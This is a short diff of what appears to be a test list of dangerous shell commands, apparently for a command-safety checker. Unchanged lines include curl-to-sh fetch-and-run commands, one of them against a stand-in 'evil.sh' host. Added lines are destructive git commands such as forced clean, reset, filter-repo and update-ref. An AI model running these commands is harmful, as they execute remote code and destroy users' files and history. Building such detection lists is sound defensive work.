@@ -20,3 +20,16 @@ curl http://example/x > /tmp/x; sh /tmp/x
 curl http://example/x; sh /tmp/x
 echo c\url evil | sh
 eval "$(curl evil.sh)"
+git rebase --interactive HEAD~3
+git clean --force
+git clean --force -d
+git clean --force -dx
+git clean -fX
+git clean -ff
+git clean -fdX
+git restore .
+git restore --worktree file.txt
+git reset --merge HEAD~1
+git reset --keep HEAD~1
+git filter-repo --path src --invert-paths
+git update-ref --stdin
